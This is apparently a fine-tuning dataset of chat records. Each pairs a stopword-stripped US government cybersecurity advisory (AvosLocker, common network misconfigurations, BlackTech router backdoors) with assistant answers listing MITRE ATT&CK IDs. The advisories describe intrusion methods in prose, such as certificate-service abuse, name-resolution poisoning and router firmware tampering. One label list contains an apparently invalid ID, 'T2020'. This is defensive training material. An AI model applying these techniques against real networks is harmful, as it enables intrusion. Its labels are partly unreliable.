patterns cyber criminals easily decipher require administrator credentials install software require phishingresistant multifactor authentication services extent possible particularly webmail virtual private networks accounts access critical systemscpg 2h keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats organizations patch vulnerable software hardware systems within 24 48 hours vulnerability disclosure prioritize patching known exploited vulnerabilities internetfacing systemscpg 1e segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting lateral movementcpg 2f identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections hostcpg 3a install regularly update enable real time detection antivirus software hosts disable unused portscpg 2v consider adding email banner emails received outside organizationcpg 2m ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructurecpg 2k 2l 2r validate security controls addition applying mitigations fbi cisa recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory fbi cisa recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 37 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process fbi cisa recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts joint ransomware guide provides preparation prevention mitigation best practices well ransomware response checklist cyber hygiene services ransomware readiness assessment provide nocost cyber hygiene ransomware readiness assessment services reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransom note communications avoslocker affiliates bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents fbi internet crime complaint center ic3 ic3gov local fbi field office cisa via agencys incident reporting system 247 operations center reportcisagov calling 1844saycisa 18447292472 disclaimer information report provided informational purposes cisa fbi endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa fbi references1 github sysdream ligolo repository2 github jpillora chisel repository3 github bishopfox sliver repository product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1047, T1059.001, T1059.003, T1133, T1505.003, T1555, T1572"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: plea network defenders software manufacturers fix common problems executive summary national security agency nsa cybersecurity infrastructure security agency cisa releasing joint cybersecurity advisory csa highlight common cybersecurity misconfigurations large organizations detail tactics techniques procedures ttps actors use exploit misconfigurations nsa cisa red blue team assessments well activities nsa cisa hunt incident response teams agencies identified following 10 common network misconfigurations default configurations software applications improper separation useradministrator privilege insufficient internal network monitoring lack network segmentation poor patch management bypass system access controls weak misconfigured multifactor authentication mfa methods insufficient access control lists acls network shares services poor credential hygiene unrestricted code execution misconfigurations illustrate 1 trend systemic weaknesses many large organizations including mature cyber postures 2 importance software manufacturers embracing securebydesign principles reduce burden network defenders properly trained staffed funded network security teams implement known mitigations weaknesses software manufacturers must reduce prevalence misconfigurationsthus strengthening security posture customersby incorporating securebydesign default principles tactics software development practices1 nsa cisa encourage network defenders implement recommendations found within mitigations section advisoryincluding followingto reduce risk malicious actors exploiting identified misconfigurations remove default credentials harden configurations disable unused services implement access controls update regularly automate patching prioritizing patching known exploited vulnerabilities2 reduce restrict audit monitor administrative accounts privileges nsa cisa urge software manufacturers take ownership improving security outcomes customers embracing securebydesign anddefault tactics including embedding security controls product architecture start development throughout entire software development lifecycle sdlc eliminating default passwords providing highquality audit logs customers extra charge mandating mfa ideally phishingresistant privileged users making mfa default rather optin feature3 download pdf version report pdf 660 kb technical details note advisory uses mitre attck enterprise framework version 13 mitre d3fend cybersecurity countermeasures framework45 see appendix mitre attck tactics techniques section tables summarizing threat actors activity mapped mitre attck tactics techniques mitigations section mitre d3fend countermeasures assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool67 overview years following nsa cisa teams assessed security posture many network enclaves across department defense dod federal civilian executive branch fceb state local tribal territorial sltt governments private sector depending needs assessment nsa defensive network operations dno teams feature capabilities red team adversary emulation blue team strategic vulnerability assessment hunt targeted hunt andor tailored mitigations defensive countermeasure development cisa vulnerability management vm teams assessed security posture 1000 network enclaves cisa vm teams include risk vulnerability assessment rva cisa red team assessments rta8 rva team conducts remote onsite assessment services including penetration testing configuration review rta emulates cyber threat actors coordination organization assess organizations cyber detection response capabilities cisa hunt incident response teams conduct proactive reactive engagements respectively organization networks identify detect cyber threats us infrastructure assessments nsa cisa identified 10 common network misconfigurations detailed misconfigurations nonprioritized systemic weaknesses across many networks many assessments microsoft windows active directory environments advisory provides details mitigations specific issues found assessments mostly focuses products however noted many environments contain similar misconfigurations network owners operators examine networks similar misconfigurations even running software specifically mentioned 1 default configurations software applications default configurations systems services applications permit unauthorized access malicious activity common default configurations include default credentials default service permissions configurations settings default credentials many software manufacturers release commercial offtheshelf cots network devices provide user access via applications web portalscontaining predefined default credentials builtin administrative accounts9 malicious actors assessment teams regularly abuse default credentials finding credentials simple web search using gain authenticated access device resetting builtin administrative accounts via predictable forgotten passwords questions leveraging default virtual private network vpn credentials internal network access leveraging publicly available setup information identify builtin administrative credentials web applications gaining access application underlying database leveraging default credentials software deployment tools code execution lateral movement addition devices provide network access printers scanners security cameras conference room audiovisual av equipment voice internet protocol voip phones internet things iot devices commonly contain default credentials used easy unauthorized access devices well compounding problem printers scanners may privileged domain accounts loaded users easily scan documents upload shared drive email malicious actors gain access printer scanner using default credentials use loaded privileged domain accounts move laterally device compromise domain default service permissions configuration settings certain services may overly permissive access controls vulnerable configurations default additionally even providers enable services default malicious actors easily abuse services users administrators enable assessment teams regularly find following insecure active directory certificate services insecure legacy protocolsservices insecure server message block smb service insecure active directory certificate services active directory certificate services adcs feature used manage public key infrastructure pki certificates keys encryption inside active directory ad environments adcs templates used build certificates different types servers entities organizations network malicious actors exploit adcs andor adcs template misconfigurations manipulate certificate infrastructure issuing fraudulent certificates andor escalate user privileges domain administrator privileges certificates domain escalation paths may grant actors unauthorized persistent access systems critical data ability impersonate legitimate entities ability bypass security measures assessment teams observed organizations following misconfigurations adcs servers running webenrollment enabled webenrollment enabled unauthenticated actors coerce server authenticate actorcontrolled computer relay authentication adcs webenrollment service obtain certificate servers account fraudulent trusted certificates enable actors use adversaryinthemiddle techniques masquerade trusted entities network actors also use certificate ad authentication obtain kerberos ticket granting ticket tgt use compromise server usually entire domain adcs templates lowprivileged users enrollment rights enrollee supplies subject alternative name misconfiguring various elements adcs templates result domain escalation unauthorized users eg granting lowprivileged users certificate enrollment rights allowing requesters specify subjectaltname certificate signing requestcsr requiring authorized signatures csrs granting fullcontrol writedacl permissions users malicious actors use lowprivileged user account request certificate particular subject alternative name san gain certificate san matches user principal name upn privileged account note information known escalation paths including petitpotam ntlm relay techniques see domain escalation petitpotam ntlm relay adcs endpoints certified preowned active directory certificate services101112 insecure legacy protocolsservices many vulnerable network services enabled default assessment teams observed enabled production environments specifically assessment teams observed linklocal multicast name resolution llmnr netbios name service nbtns microsoft windows components serve alternate methods host identification services enabled network actors use spoofing poisoning relay techniques obtain domain hashes system access potential administrative system sessions malicious actors frequently exploit protocols compromise entire windows environments malicious actors spoof authoritative source name resolution target network responding passing traffic effectively poisoning service target computers communicate actorcontrolled system instead intended one requested system requires identificationauthentication target computer send users username hash actorcontrolled system actors collect hash crack offline obtain plain text password insecure server message block smb service server message block service windows component primarily file sharing default configuration including latest version windows require signing network messages ensure authenticity integrity smb servers enforce smb signing malicious actors use machineinthemiddle techniques ntlm relay malicious actors combine lack smb signing name resolution poisoning issue see gain access remote systems without needing capture crack hashes 2 improper separation useradministrator privilege administrators often assign multiple roles one account accounts access wide range devices services allowing malicious actors move network quickly one compromised account without triggering lateral movement andor privilege escalation detection measures assessment teams observed following common account separation misconfigurations excessive account privileges elevated service account permissions nonessential use elevated accounts excessive account privileges account privileges intended control user access host application resources limit access sensitive information enforce leastprivilege security model account privileges overly permissive users see andor things able becomes security issue increases risk exposure attack surface expanding organizations undergo numerous changes account management personnel access requirements changes commonly lead privilege creepthe granting excessive access unnecessary account privileges analysis topical nested ad groups malicious actor find user account granted account privileges exceed needtoknow leastprivilege function extraneous access lead easy avenues unauthorized access data resources escalation privileges targeted domain elevated service account permissions applications often operate using user accounts access resources user accounts known service accounts often require elevated privileges malicious actor compromises application service using service account privileges access service account malicious actors exploit elevated service permissions within domain gain unauthorized access control critical systems service accounts enticing targets malicious actors accounts often granted elevated permissions within domain due nature service access use service requested valid domain user due factors kerberoastinga form credential access achieved cracking service account credentialsis common technique used gain control service account targets nonessential use elevated accounts personnel use domain administrator administrator accounts system network management due inherent elevated privileges administrator account logged compromised host malicious actor steal use accounts credentials adgenerated authentication token move using elevated permissions throughout domain using elevated account normal daytoday nonadministrative tasks increases accounts exposure therefore risk compromise risk network malicious actors prioritize obtaining valid domain credentials upon gaining access network authentication using valid domain credentials allows execution secondary enumeration techniques gain visibility target domain ad structure including discovery elevated accounts elevated accounts used targeting elevated accounts domain administrator system administrators performing daytoday activities provides direct path achieve domain escalation systems applications accessed targeted elevated accounts significantly increase attack surface available adversaries providing additional paths escalation options obtaining initial access via account administrative permissions assessment team compromised domain business day team first gained initial access system phishing enticed end user download execute malicious payloads targeted enduser account administrative permissions enabling team quickly compromise entire domain 3 insufficient internal network monitoring organizations optimally configure host network sensors traffic collection endhost logging insufficient configurations could lead undetected adversarial compromise additionally improper sensor configurations limit traffic collection capability needed enhanced baseline development detract timely detection anomalous activity assessment teams exploited insufficient monitoring gain access assessed networks example assessment team observed organization hostbased monitoring network monitoring hostbased monitoring informs defensive teams adverse activities singular hosts network monitoring informs adverse activities traversing hosts example organization could identify infected hosts could identify infection coming thus could stop future lateral movement infections assessment team gained persistent deep access large organization mature cyber posture organization detect assessment teams lateral movement persistence command control c2 activity including team attempted noisy activities trigger security response information activity see csa cisa red team shares key findings improve monitoring hardening networks13 4 lack network segmentation network segmentation separates portions network security boundaries lack network segmentation leaves security boundaries user production critical system networks insufficient network segmentation allows actor compromised resource network move laterally across variety systems uncontested lack network segregation additionally leaves organizations significantly vulnerable potential ransomware attacks postexploitation techniques lack segmentation operational technology ot environments places ot environments risk example assessment teams often gained access ot networksdespite prior assurance networks fully air gapped possible connection networkby finding special purpose forgotten even accidental network connections 5 poor patch management vendors release patches updates address security vulnerabilities poor patch management network hygiene practices often enable adversaries discover open attack vectors exploit critical vulnerabilities poor patch management includes lack regular patching use unsupported operating systems oss outdated firmware lack regular patching failure apply latest patches leave system open compromise publicly available exploits due ease discoveryvia vulnerability scanning open source researchand exploitation systems immediate targets adversaries allowing critical vulnerabilities remain production systems without applying corresponding patches significantly increases attack surface organizations prioritize patching known exploited vulnerabilities environments2 assessment teams observed threat actors exploiting many cves publicfacing applications including cve201918935 unpatched instance telerik ui aspnet running microsoft iis server14 cve202144228 log4shell unpatched vmware horizon server15 cve202224682 cve202227924 cve202227925 chained cve202237042 cve202230333 unpatched zimbra collaboration suite16 use unsupported oss outdated firmware using software hardware longer supported vendor poses significant security risk new existing vulnerabilities longer patched malicious actors exploit vulnerabilities systems gain unauthorized access compromise sensitive data disrupt operations assessment teams frequently observe organizations using unsupported windows operating systems without updates ms17010 ms0867 updates released years ago address critical remote code execution vulnerabilities1718 6 bypass system access controls malicious actor bypass system access controls compromising alternate authentication methods environment malicious actor collect hashes network use hashes authenticate using nonstandard means passthehash pth mimicking accounts without cleartext password actor expand fortify access without detection kerberoasting also one timeefficient ways elevate privileges move laterally throughout organizations network 7 weak misconfigured mfa methods misconfigured smart cards tokens networks generally government dod networks require accounts use smart cards tokens multifactor requirements misconfigured password hashes accounts never change even though password longer usedbecause smart card token required insteadthere still password hash account used alternative credential authentication password hash never changes malicious actor accounts password hash actor use indefinitely via pth technique long account exists lack phishingresistant mfa forms mfa vulnerable phishing push bombing exploitation signaling system 7 ss7 protocol vulnerabilities andor sim swap techniques attempts successful may allow threat actor gain access mfa authentication credentials bypass mfa access mfaprotected systems see cisas fact sheet implementing phishingresistant mfa information3 example assessment teams used voice phishing convince users provide missing mfa information one instance assessment team knew users main credentials login attempts blocked mfa requirements team masqueraded staff convinced user provide mfa code phone allowing team complete login attempt gain access users email organizational resources 8 insufficient acls network shares services data shares repositories primary targets malicious actors network administrators may improperly configure acls allow unauthorized users access sensitive administrative data shared drives actors use commands open source tools custom malware look shared folders drives one compromise team observed actors use net share commandwhich displays information shared resources local computerand ntfsinfo command search network shares compromised computers compromise actors used custom tool covalentstealer designed identify file shares system categorize files upload files remote server1920 ransomware actors used softperfect network scanner netscanexewhich ping computers scan ports discover shared foldersand sharpshares enumerate accessible network shares domain2122 malicious actors collect exfiltrate data shared drives folders use data variety purposes extortion organization intelligence formulating intrusion plans network compromise assessment teams routinely find sensitive information network shares could facilitate followon activity provide opportunities extortion teams regularly find drives containing cleartext credentials service accounts web applications even domain administrators even access directly obtained credentials file shares treasure trove information improving situational awareness target network including networks topology service tickets vulnerability scan data addition teams regularly identify sensitive data pii shared drives eg scanned documents social security numbers tax returns could used extortion social engineering organization individuals 9 poor credential hygiene poor credential hygiene facilitates threat actors obtaining credentials initial access persistence lateral movement followon activity especially phishingresistant mfa enabled poor credential hygiene includes easily crackable passwords cleartext password disclosure easily crackable passwords easily crackable passwords passwords malicious actor guess within short time using relatively inexpensive computing resources presence easily crackable passwords network generally stems lack password length ie shorter 15 characters randomness ie unique guessed often due lax requirements passwords organizational policies user training policy requires short simple passwords leaves user passwords susceptible password cracking organizations provide allow employee use password managers enable generation easy use secure random passwords account often credential obtained hash oneway encryption password password although hashes used directly pth techniques many hashes need cracked obtain usable credentials cracking process takes captured hash users plaintext password leverages dictionary wordlists rulesets often using database billions previously compromised passwords attempt find matching plaintext password one primary ways crack passwords open source tool hashcat combined password lists obtained publicly released password breaches malicious actor access plaintext password usually limited accounts permissions cases actor may restricted detected advanced defenseindepth zero trust implementations well rare finding assessments thus far assessment teams cracked password hashes ntlm users kerberos service account tickets netntlmv2 pfx stores enabling team elevate privileges move laterally within networks 12 hours one team cracked 80 users passwords active directory resulting hundreds valid credentials cleartext password disclosure storing passwords cleartext serious security risk malicious actor access files containing cleartext passwords could use credentials log affected applications systems guise legitimate user accountability lost situation system logs would record valid user accounts accessing applications systems malicious actors search text files spreadsheets documents configuration files hopes obtaining cleartext passwords assessment teams frequently discover cleartext passwords allowing quickly escalate emulated intrusion compromise regular domain user account privileged account domain enterprise administrator common tool used locating cleartext passwords open source tool snaffler23 10 unrestricted code execution unverified programs allowed execute hosts threat actor run arbitrary malicious payloads within network malicious actors often execute code gaining initial access system example user falls phishing scam actor usually convinces victim run code workstation gain remote access internal network code usually unverified program legitimate purpose business reason running network assessment teams malicious actors frequently leverage unrestricted code execution form executables dynamic link libraries dlls html applications macros scripts used office automation documents establish initial access persistence lateral movement addition actors often use scripting languages obscure actions bypass allowlistingwhere organizations restrict applications forms code default allow known trusted actors may load vulnerable drivers exploit drivers known vulnerabilities execute code kernel highest level system privileges completely compromise device mitigations network defenders nsa cisa recommend network defenders implement recommendations follow mitigate issues identified advisory mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist well mitre attck enterprise mitigations mitre d3fend frameworks cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections24 mitigate default configurations software applications mitigate improper separation useradministrator privilege mitigate insufficient internal network monitoring mitigate lack network segmentation mitigate poor patch management mitigate bypass system access controls mitigate weak misconfigured mfa methods mitigate insufficient acls network shares services mitigate poor credential hygiene mitigate unrestricted code execution software manufacturers nsa cisa recommend software manufacturers implement recommendations table 11 reduce prevalence misconfigurations identified advisory mitigations align tactics provided joint guide shifting balance cybersecurity risk principles approaches securitybydesign default nsa cisa strongly encourage software manufacturers apply recommendations ensure products secure box require customers spend additional resources making configuration changes performing monitoring conducting routine updates keep systems secure1 validate security controls addition applying mitigations nsa cisa recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory nsa cisa recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 12table 21 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa nsa recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory learn history misconfigurations described common assessments techniques listed standard ones leveraged multiple malicious actors resulting numerous real network compromises learn weaknesses others implement mitigations properly protect network sensitive information critical missions works cited1 joint guide shifting balance cybersecurity risk principles approaches securitybydesign default 2023 httpswwwcisagovsitesdefaultfiles202306principlesapproachesforsecuritybydesigndefault508cpdf2 cisa known exploited vulnerabilities catalog httpswwwcisagovknownexploitedvulnerabilitiescatalog3 cisa implementing phishingresistant mfa httpswwwcisagovsitesdefaultfilespublicationsfactsheetimplementingphishingresistantmfa508cpdf4 mitre attck enterprise httpsattackmitreorgversionsv13matricesenterprise5 mitre d3fend httpsd3fendmitreorg6 cisa best practices mitre attck mapping httpswwwcisagovnewseventsnewsbestpracticesmitreattckrmapping7 cisa decider tool httpsgithubcomcisagovdecider8 cisa cyber assessment fact sheet httpswwwcisagovsitesdefaultfilespublicationsvmassessmentsfactsheetrva508cpdf9 joint csa weak security controls practices routinely exploited initial access httpsmediadefensegov2022may172002998718110csaweaksecuritycontrolspracticesexploitedforinitialaccesspdf10 microsoft kb5005413 mitigating ntlm relay attacks active directory certificate services ad cs httpssupportmicrosoftcomenustopickb5005413mitigatingntlmrelayattacksonactivedirectorycertificateservicesadcs3612b77340434aa9b23db87910cd342911 raj chandel domain escalation petitpotam ntlm relay adcs endpoints httpswwwhackingarticlesindomainescalationpetitpotamntlmrelaytoadcsendpoints12 specterops schroeder certified preowned httpspostsspecteropsiocertifiedpreownedd95910965cd213 cisa csa cisa red team shares key findings improve monitoring hardening networks httpswwwcisagovnewseventscybersecurityadvisoriesaa23059a14 joint csa threat actors exploit progress telerik vulnerabilities multiple us government iis servers httpswwwcisagovnewseventscybersecurityadvisoriesaa23074a15 joint csa iranian governmentsponsored apt actors compromise federal network deploy crypto miner credential harvester httpswwwcisagovnewseventscybersecurityadvisoriesaa22320a16 joint csa threat actors exploiting multiple cves zimbra collaboration suite httpswwwcisagovnewseventscybersecurityadvisoriesaa22228a17 microsoft verify ms17010 installed httpssupportmicrosoftcomenustopichowtoverifythatms17010isinstalledf55d3f137a9c688c260b477d0ec9f2c818 microsoft microsoft security bulletin ms08067 critical vulnerability server service could allow remote code execution 958644 httpslearnmicrosoftcomenussecurityupdatessecuritybulletins2008ms0806719 joint csa impacket exfiltration tool used steal sensitive information defense industrial base organization httpswwwcisagovnewseventscybersecurityadvisoriesaa22277a20 cisa malware analysis report 10365227r1v1 httpswwwcisagovsitesdefaultfiles202306mar10365227r1v1clearpdf21 joint csa stopransomware bianlian ransomware group httpswwwcisagovnewseventscybersecurityadvisoriesaa23136a22 cisa analysis report fivehands ransomware httpswwwcisagovnewseventsanalysisreportsar21126a23 snaffler httpsgithubcomsnaffconsnaffler24 cisa crosssector cybersecurity performance goals httpswwwcisagovcrosssectorcybersecurityperformancegoals25 defense information systems agency disa security technical implementation guides stigs httpspubliccybermilstigs26 nsa network infrastructure security guide httpsmediadefensegov2022jun152003018261110ctrnsanetworkinfrastructuresecurityguide20220615pdf27 nsa actively manage systems configurations httpsmediadefensegov2019sep092002180326110actively20manage20systems20and20configurationsdocx2020copypdf28 nsa cybersecurity advisories guidance httpswwwnsagovcybersecurityguidance29 national institute standards technologies nist nist sp 80063b digital identity guidelines authentication lifecycle management httpscsrcnistgovpubssp80063bupd2final30 microsoft uninstalladcswebenrollment httpslearnmicrosoftcomenuspowershellmoduleadcsdeploymentuninstalladcswebenrollment31 microsoft kb5021989 extended protection authentication httpssupportmicrosoftcomenautopickb5021989extendedprotectionforauthentication1b6ea84d377b4677a0b8af74efbb243f32 microsoft network security restrict ntlm ntlm authentication domain httpslearnmicrosoftcomenuswindowssecuritythreatprotectionsecuritypolicysettingsnetworksecurityrestrictntlmntlmauthenticationinthisdomain33 microsoft network security restrict ntlm incoming ntlm traffic httpslearnmicrosoftcomenuswindowssecuritythreatprotectionsecuritypolicysettingsnetworksecurityrestrictntlmincomingntlmtraffic34 microsoft disable subject alternative name upn mapping httpslearnmicrosoftcomenustroubleshootwindowsserverwindowssecuritydisablesubjectalternativenameupnmapping35 microsoft overview server message block signing httpslearnmicrosoftcomenustroubleshootwindowsservernetworkingoverviewservermessageblocksigning36 microsoft smb signing required default windows insider httpsakamssmbsigningrequired37 nsa defend privileges accounts httpsmediadefensegov2019sep092002180330110defend20privileges20and20accounts2020copypdf38 nsa advancing zero trust maturity throughout user pillar httpsmediadefensegov2023mar142003178390110csizerotrustuserpillarv11pdf39 nsa continuously hunt network intrusions httpsmediadefensegov2019sep092002180360110continuously20hunt20for20network20intrusions2020copypdf40 joint csi detect prevent web shell malware httpsmediadefensegov2020jun092002313081110csidetectandpreventwebshellmalware20200422pdf41 nsa segment networks deploy applicationaware defenses httpsmediadefensegov2019sep092002180325110segment20networks20and20deploy20application20aware20defenses2020copypdf42 joint csa nsa cisa recommend immediate actions reduce exposure across operational technologies control systems httpsmediadefensegov2020jul232002462846110otadvisorydualofficial20200722pdf43 nsa stop malicious cyber activity connected operational technology httpsmediadefensegov2021apr292002630479110csastopmcaagainstotuoo13672321pdf44 nsa performing outofband network management httpsmediadefensegov2020sep172002499616110performingoutofbandnetworkmanagement20200911pdf45 nsa update upgrade software immediately httpsmediadefensegov2019sep092002180319110update20and20upgrade20software20immediatelydocx2020copypdf46 microsoft microsoft security advisory 2871997 update improve credentials protection management httpslearnmicrosoftcomenussecurityupdatessecurityadvisories2016287199747 cisa secure cloud business applications hybrid identity solutions architecture httpswwwcisagovsitesdefaultfiles202303cssoscubaguidancedocumenthybrididentitysolutionsarchitecture20230322finalpdf48 cisa secure cloud business applications scuba project httpswwwcisagovresourcestoolsservicessecurecloudbusinessapplicationsscubaproject49 nsa transition multifactor authentication httpsmediadefensegov2019sep092002180346110transition20to20multifactor20authentication2020copypdf50 committee national security systems cnss cnss policy 15 httpswwwcnssgovcnssissuancespoliciescfm51 nsa nsa releases future quantumresistant qr algorithm requirements national security systems httpswwwnsagovpressroomnewshighlightsarticlearticle3148990nsareleasesfuturequantumresistantqralgorithmrequirementsfornationalse52 nsa enforce signed software execution policies httpsmediadefensegov2019sep092002180334110enforce20signed20software20execution20policies2020copypdf53 joint csi keeping powershell security measures use embrace httpsmediadefensegov2022jun222003021689110csikeepingpowershellsecuritymeasurestouseandembrace20220622pdf54 nist nist sp 800218 secure software development framework ssdf version 11 recommendations mitigating risk software vulnerabilities httpscsrcnistgovpublicationsdetailsp800218final disclaimer endorsement information opinions contained document provided without warranties guarantees reference herein specific commercial products process service trade name trademark manufacturer otherwise constitute imply endorsement recommendation favoring united states government guidance shall used advertising product endorsement purposes trademarks active directory microsoft windows registered trademarks microsoft corporationmitre attck registered trademark mitre d3fend trademark mitre corporationsoftperfect registered trademark softperfect proprietary limited companytelerik registered trademark progress software corporationvmware registered trademark vmware inczimbra registered trademark synacor inc purpose document developed furtherance authoring cybersecurity organizations missions including responsibilities identify disseminate threats develop issue cybersecurity specifications mitigations information may shared broadly reach appropriate stakeholders contact cybersecurity report feedback cybersecurityreportsnsagovgeneral cybersecurity inquiries cybersecurityrequestsnsagovdefense industrial base inquiries cybersecurity services dibdefensecybernsagovmedia inquiries press desk 4436340721 mediarelationsnsagov organizations also report anomalous cyber activity andor cyber incidents 247 toreportcisagovor calling 1844saycisa 18447292472 available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact appendix mitre attck tactics techniques see table 12table 21 referenced threat actor tactics techniques advisory product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1018, T1021.002, T1039, T1046, T1059, T1059.005, T1068, T1072, T1078, T1078.001, T1078.002, T1083, T1087, T1098, T1110.002, T1111, T1133, T1135, T1190, T1199, T1204, T1210, T1528, T1550.002, T1552, T1552.001, T1555, T1557, T1557.001, T1558.001, T1558.003, T1566, T1589.001, T1595.002, T1598, T1621, T1649, T2020"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: executive summary united states national security agency nsa us federal bureau investigation fbi us cybersecurity infrastructure security agency cisa japan national police agency npa japan national center incident readiness strategy cybersecurity nisc hereafter referred authoring agencies releasing joint cybersecurity advisory csa detail activity peoples republic china prclinked cyber actors known blacktech blacktech demonstrated capabilities modifying router firmware without detection exploiting routers domaintrust relationships pivoting international subsidiaries headquarters japan us primary targets authoring agencies recommend implementing mitigations described detect activity protect devices backdoors blacktech actors leaving behind blacktech aka palmerworm tempoverboard circuit panda radio panda actors targeted government industrial technology media electronics telecommunication sectors including entities support militaries us japan blacktech actors use custom malware dualuse tools living land tactics disabling logging routers conceal operations csa details blacktechs tactics techniques procedures ttps highlights need multinational corporations review subsidiary connections verify access consider implementing zero trust models limit extent potential blacktech compromise information risks posed deep level unauthorized access see csa peoples republic china statesponsored cyber actors exploit network providers devices1 download pdf version report pdf 808 kb technical details advisory uses mitre attck enterprise framework version 131 see appendix mitre attck techniques referenced ttps background active since 2010 blacktech actors historically targeted wide range us east asia public organizations private industries blacktech actors ttps include developing customized malware tailored persistence mechanisms compromising routers ttps allow actors disable logging abuse trusted domain relationships pivot international subsidiaries domestic headquarters networks observable ttps blacktech cyber actors use custom malware payloads remote access tools rats target victims operating systems actors used range custom malware families targeting windows linux freebsd operating systems custom malware families employed blacktech include bendybears0574 bifrose btsdoor fakedead aka tscookies0436 flagpros0696 frontshell fakedeads downloader module icondown pleads0435 spiderpig spiderspring spiderstack waterbears0579 blacktech actors continuously update tools evade detection security software actors also use stolen codesigning certificates sign malicious payloads make appear legitimate therefore difficult security software detect blacktech actors use living land ttps blend normal operating system network activities allowing evade detection endpoint detection response edr products common methods persistence host include netcat shells modifying victim registry enable remote desktop protocol rdp secure shell ssh actors also used snscan enumeration local file transfer protocol ftp server move data victim network additional examples malicious cyber actors living land see peoples republic china statesponsored cyber actor living land evade detection2 pivoting international subsidiaries prclinked blacktech actors target international subsidiaries us japanese companies gaining access subsidiaries internal networks blacktech actors able pivot trusted internal routers subsidiaries companies headquarters networks blacktech actors exploit trusted network relationships established victim entities expand access target networks specifically upon gaining initial foothold target network gaining administrator access network edge devices blacktech cyber actors often modify firmware hide activity across edge devices maintain persistence network extend foothold across organization blacktech actors target branch routerstypically smaller appliances used remote branch offices connect corporate headquartersand abuse trusted relationship branch routers within corporate network targeted blacktech actors use compromised publicfacing branch routers part infrastructure proxying traffic blending corporate network traffic pivoting victims corporate network maintaining access via stealthy router backdoors blacktech targeted exploited various brands versions router devices ttps routers enable actors conceal configuration changes hide commands disable logging blacktech actors conduct operations blacktech actors compromised several cisco routers using variations customized firmware backdoor backdoor functionality enabled disabled specially crafted tcp udp packets ttp solely limited cisco routers similar techniques could used enable backdoors network equipment cases blacktech actors replace firmware certain cisco iosbased routers malicious firmware although blacktech actors already elevated privileges router replace firmware via commandline execution malicious firmware used establish persistent backdoor access obfuscate future malicious activity modified firmware uses builtin ssh backdoor allowing blacktech actors maintain access compromised router without blacktech connections logged blacktech actors bypass routers builtin security features first installing older legitimate firmware modify memory allow installation modified unsigned bootloader modified unsigned firmware modified bootloader enables modified firmware continue evading detection however always necessary blacktech actors may also hide presence obfuscate changes made compromised cisco routers hiding embedded event manager eem policiesa feature usually used cisco ios automate tasks execute upon specified eventsthat manipulate cisco ios commandline interface cli command results compromised router blacktechcreated eem policy waits specific commands execute obfuscation measures deny execution specified legitimate commands policy two functions 1 remove lines containing certain strings output specified legitimate cisco ios cli commands 2 prevent execution legitimate cli commands hindering forensic analysis blocking copy rename move commands associated eem policy firmware replacement process blacktech actors utilize following file types compromise router files downloaded router via ftp ssh blacktech actors use cisco routers cli replace routers ios image firmware process begins firmware modified memoryalso called hot patchingto allow installation modified bootloader modified firmware capable bypassing routers security features specifically constructed packet triggers router enable backdoor bypasses logging access control list acl steps follows download old legitimate firmware set router load old legitimate firmware reboot following commands download modified bootloader modified firmware set router load modified firmware following commands load modified bootloader router reboots automatically following command enable access sending trigger packet specific values within udp data tcp sequence number field maximum segment size mss parameter within tcp options field modified bootloader allow modified bootloader firmware installed cisco ios without detection cyber actors install old legitimate firmware modify running firmware memory bypass firmware signature checks cisco rom monitor rommon signature validation functions modified versions instructions allow actors bypass functions ios image load test field upgradeable rommon integrity test modified firmware blacktech actors install modified ios image firmware allows backdoor access via ssh bypass routers normal logging functions firmware consists cisco ios loader load embedded ios image blacktech actors hook several functions embedded cisco ios image jump code overwrite existing code handle magic packet checking implement ssh backdoor bypass logging functionality compromised router modified instructions bypass command logging ip address acls error logging enable backdoor functions firmware checks incoming trigger packets enables disables backdoor functionality backdoor enabled associated logging functions router bypassed source ip address stored used bypass acl handling matching packets ssh backdoor includes special username require additional authentication detection mitigation techniques order detect mitigate blacktech malicious activity authoring agencies strongly recommend following detection mitigation techniques would trivial blacktech actors modify values backdoors would render specific signatures router backdoor obsolete robust detection network defenders monitor network devices unauthorized downloads bootloaders firmware images reboots network defenders also monitor unusual traffic destined router including ssh following best mitigation practices defend type malicious activity disable outbound connections applying transport output none configuration command virtual teletype vty lines command prevent copy commands successfully connecting external 